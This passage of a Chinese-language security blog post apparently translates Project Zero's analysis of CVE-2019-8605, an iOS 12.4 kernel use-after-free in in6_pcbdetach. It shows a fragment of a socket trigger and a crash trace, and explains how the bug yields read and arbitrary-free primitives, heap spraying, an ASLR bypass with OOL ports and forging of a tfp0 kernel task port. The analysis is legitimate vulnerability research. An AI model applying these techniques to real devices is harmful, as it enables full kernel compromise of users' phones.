class="line">    connect(s, (<span class="type">const</span> sockaddr*)&amp;sa1, <span class="keyword">sizeof</span>(sa1));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buffer[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line">    setsockopt(s, <span class="number">41</span>, <span class="number">50</span>, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    connect(s, (<span class="type">const</span> sockaddr*)&amp;sa2, <span class="keyword">sizeof</span>(sa2));</span><br><span class="line">    close(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>崩溃后的栈跟踪情况：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0 0x497a3d in free _asan_rtl_:3</span></span><br><span class="line"><span class="comment">#1 0x7f8bbe5f42cd in in6_pcbdetach /src/bsd/netinet6/in6_pcb.c:681:3</span></span><br><span class="line"><span class="comment">#2 0x7f8bbe6b06d0 in rip6_detach /src/bsd/netinet6/raw_ip6.c:829:2</span></span><br><span class="line"><span class="comment">#3 0x7f8bbe6af680 in rip6_abort /src/bsd/netinet6/raw_ip6.c:837:9</span></span><br><span class="line"><span class="comment">#4 0x7f8bbe6b0795 in rip6_disconnect /src/bsd/netinet6/raw_ip6.c:848:9</span></span><br><span class="line"><span class="comment">#5 0x7f8bbe10132f in sodisconnectlocked /src/bsd/kern/uipc_socket.c:1792:10</span></span><br><span class="line"><span class="comment">#6 0x7f8bbe1028dc in soconnectlock /src/bsd/kern/uipc_socket.c:1664:15</span></span><br><span class="line"><span class="comment">#7 0x7f8bbe133e00 in connectit /src/bsd/kern/uipc_syscalls.c:954:10</span></span><br><span class="line"><span class="comment">#8 0x7f8bbe133b25 in connect_nocancel /src/bsd/kern/uipc_syscalls.c:726:10</span></span><br><span class="line"><span class="comment">#9 0x7f8bbe6f22b4 in connect_wrapper /src/fuzzing/syscall_stubs.c:125:7</span></span><br></pre></td></tr></table></figure>

<p>崩溃实际是发生在free函数上：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">in6_pcbdetach</span><span class="params">(<span class="keyword">struct</span> inpcb *inp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">ip_moptions</span> *<span class="title">imo</span>;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">ip6_moptions</span> *<span class="title">im6o</span>;</span></span><br><span class="line"></span><br><span class="line">                inp-&gt;inp_vflag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (inp-&gt;in6p_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        m_freem(inp-&gt;in6p_options);</span><br><span class="line">                        inp-&gt;in6p_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">                &#125;</span><br><span class="line">                ip6_freepcbopts(inp-&gt;in6p_outputopts); <span class="comment">// &lt;- bad, dangling pointer</span></span><br><span class="line">                ROUTE_RELEASE(&amp;inp-&gt;in6p_route);</span><br><span class="line">                <span class="comment">// free IPv4 related resources in case of mapped addr</span></span><br><span class="line">                <span class="keyword">if</span> (inp-&gt;inp_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        (<span class="type">void</span>) m_free(inp-&gt;inp_options);</span><br><span class="line">                        inp-&gt;inp_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>问题出现在对<code>ip6_freepcbopts</code>的调用上，在这里，开发者原本的意图是：在某些情况下，通过释放每个指针后将其置为NULL来重用socket选项。但由于<code>in6p_outputopts</code>是由一个指向另一个结构的指针来表示的，所以它们是由辅助函数</p>
<p><code>ip6_freepcbopts</code>释放的，该函数不知道<code>inp</code>的地址，所以不能清除<code>&amp;inp-&gt;in6p_outputopts</code>，这段代码忽略了这一点。</p>
<p>释放的缓冲区是由<code>setsockopt</code>创建的，意味着我们可以通过<code>getsockopt</code>和<code>setsockopt</code>来继续访问释放的缓冲区，分别代表着读取和写入原语。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="漏洞原语"><a href="#漏洞原语" class="headerlink" title="漏洞原语"></a>漏洞原语</h2><p>在有PAC的iOS上，漏洞利用会更加麻烦一些，需要使用一个漏洞来获取内核读写，而代码执行需要别的利用方式。</p>
<p>一个进程在内核中表示两次：一个作为Mach任务，一个作为BSD proc。</p>
<p>包含悬空指针的<code>inp6_outputopts</code>的<code>inpcb</code>：</p>
<p><img src="https://img.4hou.com/uploads/ueditor/php/upload/image/20200114/1578996014165070.png" alt="Project Zero对 iOS 12.4 内核任意地址读写漏洞的深度分析（CVE-2019-8605）"></p>
<p>通过<code>[get/set]sockopt</code>查看这些选项的<code>getter</code>和<code>setter</code>，获取<code>minmtu</code>和<code>prefer_tempaddr</code>字段的整数是很直接的，可以让我们直接从释放的缓冲区中读取数据。如果我们能够回收<code>in6po_pktinfo</code>指针，我们可以自由读取20个字节。</p>
<p><code>ip6_getpcbopt</code>实现片段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IPV6_PKTINFO:</span><br><span class="line">    <span class="keyword">if</span> (pktopt &amp;&amp; pktopt-&gt;ip6po_pktinfo)</span><br><span class="line">        optdata = (<span class="type">void</span> *)pktopt-&gt;ip6po_pktinfo;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* <span class="doctag">XXX:</span> we don&#x27;t have to do this every time... */</span></span><br><span class="line">        bzero(&amp;null_pktinfo, <span class="keyword">sizeof</span> (null_pktinfo));</span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;null_pktinfo;</span><br><span class="line">    &#125;</span><br><span class="line">    optdatalen = <span class="keyword">sizeof</span> (<span class="keyword">struct</span> in6_pktinfo); <span class="comment">// 20 bytes</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IPV6_USE_MIN_MTU:</span><br><span class="line">    <span class="keyword">if</span> (pktopt)</span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;pktopt-&gt;ip6po_minmtu;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;defminmtu;</span><br><span class="line">    optdatalen = <span class="keyword">sizeof</span> (<span class="type">int</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IPV6_PREFER_TEMPADDR:</span><br><span class="line">    <span class="keyword">if</span> (pktopt)</span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;pktopt-&gt;ip6po_prefer_tempaddr;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;defpreftemp;</span><br><span class="line">    optdatalen = <span class="keyword">sizeof</span> (<span class="type">int</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p><code>ip6po_minmtu</code>和<code>ip6po_prefer_tempaddr</code>在内存中相邻，且按照<code>qword</code>对齐，所以，如果能够使用其他包含指针的对象回收这块内存，就能够读出指针并绕过ASLR。还可以利用这些字段来进行堆喷，我们在<code>in6po_pktinfo</code>字段和<code>mintmu</code>字段中的<code>magic</code>重合的位置喷出包含我们选择的任意指针值的对象。这样我们就可以反复读出<code>minmtu</code>字段，所以如果看到我们的<code>magic</code>，我们就知道在<code>in6po_pktinfo</code>中取消引用指针是安全的。一般来说，读取<code>inp6_outputopts</code>是安全的，因为我们知道它已经被映射了，但是<code>in6po_pktinfo</code>就不安全了，因为它可能已经被其他垃圾回收了，指向未映射或不可读的内存。</p>
<p>不幸的是，<code>setsockopt</code>路径不像<code>getsockopt</code>路径那样容易使用。大多数相关的选项都是只针对root的，或者是高度受限的。这使得<code>IPV6_2292PKTINFO</code>&#x2F;<code>IPV6_PKTINFO</code>仍然是最好的选项，但在测试和阅读代码时，除了高度约束的值之外，似乎无法在那里写任何东西。<code>ipi6_addr</code>字段，看起来很适合写任意数据，但必须设置为0，才能通过未指定的检查。而接口索引必须是有效的，这就约束了我们的低值。如果接口为0，就可以释放选项。这意味着我们只能在内存的任何地方写入16个空字节加上一个非零的4字节小整数。这对于开发来说当然足够了，但是释放的情况呢？只要你传入一个包含20个空字节的<code>pktinfo</code>结构，<code>ip6_setpktopt</code>就会帮你调用<code>ip6_clearpktopts</code>，最后调用<code>free(pktopt-&gt;ip6po_pktinfo, M_IP6OPT)</code>。记住，<code>in6po_pktinfo</code>是我们的受控指针，所以这意味着我们有一个任意的free。更妙的是，我们可以在不知道其区域的情况下释放任何对象。这是因为<code>free</code>是<code>kfree_addr</code>的封装器，它代表你查找zone。为了保持后期开发的通用性，我选择了任意<code>free</code>原语，而不是约束的写原语。</p>
<h2 id="堆喷"><a href="#堆喷" class="headerlink" title="堆喷"></a>堆喷</h2><p>利用<code>IOSurface</code>进行堆喷。</p>
<h2 id="tfp0"><a href="#tfp0" class="headerlink" title="tfp0"></a>tfp0</h2><p>这是<code>task_for_pid</code>的缩写，它会向你返回一个Mach端口，并带有给定pid的任务的发送权。当使用<code>pid=0</code>来调用它时，将返回一个内核任务端口。</p>
<blockquote>
<p>端口类似一个描述消息队列的文件描述符，内核中每个此类消息队列都有一个接收者，和一个或多个发送者。对于一个给定的端口名，可以根据访问该队列的权限来向该队列发送或接收Mach消息。</p>
<p>如果我们具有任务端口的发送权，就可以利用mach_vm_allocate，mach_vm_deallocate，mach_vm_protect和mach_vm_read_overwrite之类的函数，来读取、写入和分配内存。</p>
</blockquote>
<p>为了更好地模拟tfp0调用，先看一个消息传递的例子，消息头结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">mach_msg_bits_t</span>    msgh_bits; <span class="comment">// &quot;disposition&quot;, e.g. MACH_MSG_TYPE_COPY_SEND</span></span><br><span class="line">  <span class="type">mach_msg_size_t</span>    msgh_size;</span><br><span class="line">  <span class="type">mach_port_t</span>        msgh_remote_port; <span class="comment">// destination port name</span></span><br><span class="line">  <span class="type">mach_port_t</span>        msgh_local_port;</span><br><span class="line">  <span class="type">mach_port_name_t</span>   msgh_voucher_port;</span><br><span class="line">  <span class="type">mach_msg_id_t</span>      msgh_id;</span><br><span class="line">&#125; <span class="type">mach_msg_header_t</span>;</span><br></pre></td></tr></table></figure>

<p>上面有两个重要的字段，<code>msgh_remote_port </code>包含目标端口名称，如果我们可以访问它，它将是内核任务端口的名称；<code>msgh_bits</code>指定了多个标志，其中之一是对我们发送的不同端口名称的消息的属性。</p>
<p>当我们想从用户区发送消息时，我们需要一个mach陷阱，它相当于系统调用，称为<code>mach_msg_overwrite_trap</code>，<code>MACH_SEND_MSG</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_return_t</span> <span class="title function_">mach_msg_overwrite_trap</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> mach_msg_overwrite_trap_args* args)</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="type">mach_msg_return_t</span> mr = MACH_MSG_SUCCESS;</span><br><span class="line">  <span class="type">vm_map_t</span> <span class="built_in">map</span> = current_map();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (option &amp; MACH_SEND_MSG) &#123;</span><br><span class="line">    <span class="type">ipc_space_t</span> space = current_space();</span><br><span class="line">    <span class="type">ipc_kmsg_t</span> kmsg;</span><br><span class="line"></span><br><span class="line">    mr = ipc_kmsg_get(msg_addr, send_size, &amp;kmsg);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    mr = ipc_kmsg_copyin(kmsg, space, <span class="built_in">map</span>, override, &amp;option);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    mr = ipc_kmsg_send(kmsg, option, msg_timeout);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>如果要把消息传递到内核任务端口，需要了解<code>ipc_kmsg_get</code>，<code>ipc_kmsg_copyin</code>和<code>ipc_kmsg_send</code>的工作方式。<code>ipc_kmsg_get</code>将消息从调用任务的地址空间复制到内核中；<code>ipc_kmsg_copyin</code>通过调用<code>ipc_kmsg_copyin_header</code>获取消息头：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_return_t</span> <span class="title function_">ipc_kmsg_copyin_header</span><span class="params">(<span class="type">ipc_kmsg_t</span> kmsg, <span class="type">ipc_space_t</span> space,</span></span><br><span class="line"><span class="params">                                         <span class="type">mach_msg_priority_t</span> override,</span></span><br><span class="line"><span class="params">                                         <span class="type">mach_msg_option_t</span> *optionp)</span> &#123;</span><br><span class="line">  <span class="type">mach_msg_header_t</span> *msg = kmsg-&gt;ikm_header;</span><br><span class="line">  <span class="type">mach_msg_bits_t</span> mbits = msg-&gt;msgh_bits &amp; MACH_MSGH_BITS_USER;</span><br><span class="line">  <span class="type">mach_port_name_t</span> dest_name = CAST_MACH_PORT_TO_NAME(msg-&gt;msgh_remote_port);</span><br><span class="line">  <span class="type">mach_port_name_t</span> reply_name = CAST_MACH_PORT_TO_NAME(msg-&gt;msgh_local_port);</span><br><span class="line"></span><br><span class="line">  <span class="type">mach_msg_type_name_t</span> dest_type = MACH_MSGH_BITS_REMOTE(mbits);</span><br><span class="line">  <span class="type">ipc_object_t</span> dest_port = IO_NULL;</span><br><span class="line">  <span class="type">ipc_port_t</span> dest_soright = IP_NULL;</span><br><span class="line">  <span class="type">ipc_entry_t</span> dest_entry = IE_NULL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dest_name != reply_name) &#123;</span><br><span class="line">    <span class="comment">// nedwill: this converts name to ipc_entry_t</span></span><br><span class="line">    dest_entry = ipc_entry_lookup(space, dest_name);</span><br><span class="line">    <span class="keyword">if</span> (dest_entry == IE_NULL) &#123;</span><br><span class="line">      <span class="keyword">goto</span> invalid_dest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// nedwill: this converts ipc_entry_t to ipc_port_t (and checks capability)</span></span><br><span class="line">    kr = ipc_right_copyin(space, dest_name, dest_entry, dest_type, FALSE,</span><br><span class="line">                          &amp;dest_port, &amp;dest_soright, &amp;release_port, &amp;assertcnt);</span><br><span class="line">    <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">      <span class="keyword">goto</span> invalid_dest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  msg-&gt;msgh_bits =</span><br><span class="line">      MACH_MSGH_BITS_SET(dest_type, reply_type, voucher_type, mbits);</span><br><span class="line">  msg-&gt;msgh_remote_port = (<span class="type">ipc_port_t</span>)dest_port;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ipc_kmsg_copyin_header</code>用于将远程端口名称转换为端口对象，更新<code>msg-&gt; msgh_remote_port</code>指向实际对象，而不是存储特定于任务的名称。消息头有几个名称字段，我们希望<code>kernel_task</code>端口是我们的目标端口。<code>ipc_space_t space</code>参数表示当前正在运行的任务的IPC空间，相当于文件描述符表。首先，我们在IPC空间中查找<code>dest_name</code>，得到代表它的<code>ipc_entry_t</code>。每个<code>ipc_entry_t</code>都有一个叫做<code>ie_bits</code>的字段，它包含了我们的任务与相关端口交互的权限。下面是IPC入口结构的样子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_entry</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> *<span class="title">ie_object</span>;</span> <span class="comment">// pointer to the ipc_port_t</span></span><br><span class="line">  <span class="type">ipc_entry_bits_t</span> ie_bits; <span class="comment">// our rights (receive/send/send-once/etc.)</span></span><br><span class="line">  <span class="type">mach_port_index_t</span> ie_index;</span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们发送的消息头有一个<code>disposition</code>的目的地，它描述了我们希望我们的消息用远程端口名的能力做什么。这里是实际验证和使用的地方：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">kern_return_t</span> <span class="title function_">ipc_right_copyin</span><span class="params">(<span class="type">ipc_space_t</span> space, <span class="type">mach_port_name_t</span> name,</span></span><br><span class="line"><span class="params">                               <span class="type">ipc_entry_t</span> entry,</span></span><br><span class="line"><span class="params">                               <span class="type">mach_msg_type_name_t</span> msgt_name, <span class="type">boolean_t</span> deadok,</span></span><br><span class="line"><span class="params">                               <span class="type">ipc_object_t</span> *objectp, <span class="type">ipc_port_t</span> *sorightp,</span></span><br><span class="line"><span class="params">                               <span class="type">ipc_port_t</span> *releasep, <span class="type">int</span> *assertcntp)</span> &#123;</span><br><span class="line">  <span class="type">ipc_entry_bits_t</span> bits;</span><br><span class="line">  <span class="type">ipc_port_t</span> port;</span><br><span class="line"></span><br><span class="line">  *releasep = IP_NULL;</span><br><span class="line">  *assertcntp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  bits = entry-&gt;ie_bits;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (msgt_name) &#123;</span><br><span class="line">    <span class="keyword">case</span> MACH_MSG_TYPE_COPY_SEND: &#123;</span><br><span class="line">      <span class="keyword">if</span> (bits &amp; MACH_PORT_TYPE_DEAD_NAME) <span class="keyword">goto</span> copy_dead;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* allow for dead send-once rights */</span></span><br><span class="line">      <span class="keyword">if</span> ((bits &amp; MACH_PORT_TYPE_SEND_RIGHTS) == <span class="number">0</span>) <span class="keyword">goto</span> invalid_right;</span><br><span class="line"></span><br><span class="line">      port = (<span class="type">ipc_port_t</span>)entry-&gt;ie_object;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((bits &amp; MACH_PORT_TYPE_SEND) == <span class="number">0</span>) &#123;</span><br><span class="line">        assert(IE_BITS_TYPE(bits) == MACH_PORT_TYPE_SEND_ONCE);</span><br><span class="line">        assert(port-&gt;ip_sorights &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        ip_unlock(port);</span><br><span class="line">        <span class="keyword">goto</span> invalid_right;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      port-&gt;ip_srights++;</span><br><span class="line">      ip_reference(port);</span><br><span class="line">      ip_unlock(port);</span><br><span class="line"></span><br><span class="line">      *objectp = (<span class="type">ipc_object_t</span>)port;</span><br><span class="line">      *sorightp = IP_NULL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    invalid_right:</span><br><span class="line">      <span class="keyword">return</span> KERN_INVALID_RIGHT;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IPC条目中的<code>ie_bits</code>是用来检查我们的权限的。如果我们想利用这条消息中的发送权限，我们可以将权限复制到消息中，这段代码在更新相关的引用计数之前，先检查我们在<code>ie_bits</code>中是否有权限，最后让我们访问可以<code>enqueue</code>消息的端口对象。如果我们没有根据<code>entry-&gt;ie_bits</code>的权限，那么发送消息的尝试就会失败。</p>
<p>现在我们的消息已经被复制、验证并更新为包含真正的内核对象指针，<code>ipc_kmsg_send</code>继续前进并将我们的消息添加到目标队列中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_return_t</span> <span class="title function_">ipc_kmsg_send</span><span class="params">(<span class="type">ipc_kmsg_t</span> kmsg, <span class="type">mach_msg_option_t</span> option,</span></span><br><span class="line"><span class="params">                                <span class="type">mach_msg_timeout_t</span> send_timeout)</span> &#123;</span><br><span class="line">  <span class="type">ipc_port_t</span> port;</span><br><span class="line">  <span class="type">thread_t</span> th = current_thread();</span><br><span class="line">  <span class="type">mach_msg_return_t</span> error = MACH_MSG_SUCCESS;</span><br><span class="line">  <span class="type">boolean_t</span> kernel_reply = FALSE;</span><br><span class="line"></span><br><span class="line">  port = (<span class="type">ipc_port_t</span>)kmsg-&gt;ikm_header-&gt;msgh_remote_port;</span><br><span class="line">  assert(IP_VALID(port));</span><br><span class="line">  ip_lock(port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (port-&gt;ip_receiver == ipc_space_kernel) &#123;</span><br><span class="line">    port-&gt;ip_messages.imq_seqno++;</span><br><span class="line">    ip_unlock(port);</span><br><span class="line"></span><br><span class="line">    kmsg = ipc_kobject_server(kmsg, option);</span><br><span class="line">    <span class="keyword">if</span> (kmsg == IKM_NULL) <span class="keyword">return</span> MACH_MSG_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* restart the KMSG_INFO tracing for the reply message */</span></span><br><span class="line">    port = (<span class="type">ipc_port_t</span>)kmsg-&gt;ikm_header-&gt;msgh_remote_port;</span><br><span class="line">    assert(IP_VALID(port));</span><br><span class="line">    ip_lock(port);</span><br><span class="line">    <span class="comment">/* fall thru with reply - same options */</span></span><br><span class="line">    kernel_reply = TRUE;</span><br><span class="line">    <span class="keyword">if</span> (!ip_active(port)) error = MACH_SEND_INVALID_DEST;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (error != MACH_MSG_SUCCESS) &#123;</span><br><span class="line">    ip_unlock(port);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    error = ipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg, option, send_timeout);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面可以看出，如果目的端口的<code>ip_receiver</code>是内核IPC空间，<code>ipc_kobject_server</code>作为特例被调用来处理内核消息。内核任务端口的<code>ip_receiver</code>是内核IPC空间，所以我们在安排tfp0的时候一定要复制。</p>
<p>我们要在IPC空间中添加一个IPC条目，<code>ie_object</code>指向内核任务端口，<code>ie_bits</code>表示我们有一个发送权。下面是它的样子：</p>
<p><img src="https://1.bp.blogspot.com/-kUj5tXrfmhc/Xe_gowmkyNI/AAAAAAAAOqc/H4UhPcVZkuopQbU03xGOimtMmOZCVLLRgCEwYBhgL/s640/2-2.png" alt="img"></p>
<h2 id="绕过ASLR并伪造数据结构"><a href="#绕过ASLR并伪造数据结构" class="headerlink" title="绕过ASLR并伪造数据结构"></a>绕过ASLR并伪造数据结构</h2><p>IPC系统一般都需要一种方法来序列化文件描述符，并通过管道发送，内核需要理解这种约定来进行适当的核算。Mach也不例外。Mach端口和文件描述符一样，可以由一个进程向另一个进程发送，并附加发送权限。你可以使用一个包含<code>mach_msg_ool_descriptor_t</code>的特殊消息，从一个进程向另一个进程发送一个<strong>行外</strong>端口。如果你想在一个消息中发送多个端口，你可以发送 <code>mach_msg_ool_ports_descriptor_t</code>，这是一个存储在行外（OOL）的端口数组，意思是在消息头本身之外。</p>
<p>我们和其他许多人一样，将在我们的开发中使用OOL端口描述符。</p>
<p>OOL端口数组之所以如此有用，是因为你可以完全控制数组的大小。当你传入一个由mach端口名组成的数组时，内核将为任意数量的指针分配空间，每一个指针都充满了指向我们要发送的<code>ipc_port</code>结构的指针。如果你没有注意到，我们可以使用这个技巧作为ASLR的旁路，因为我们可以将一个端口指针的OOL描述符数组与释放的大小为192的缓冲区重叠，然后简单地通过<code>getockopt</code>从释放的结构中读取两个相邻的int字段。这时我们就可以开始用我们的任意读取遍历内核数据结构了。</p>
<p>很多利用都会把一个bug变成一个读原语。我们有一个罕见的特权，那就是在进行任何破坏之前就有一个可靠的读原语，所以我们利用这一点结合这个指针披露来泄露所有相关的指针来完成利用，包括在一个已知地址上设置手工数据。我们现在就去做所有必要的遍历，你可以在下面看到。</p>
<p><img src="https://1.bp.blogspot.com/-4waCxHiWNR0/Xe_go0-6CYI/AAAAAAAAOqU/Ziz8NkBkqasC61FGcv4KM75K618GWow0QCEwYBhgL/s640/3-3.png" alt="img"></p>
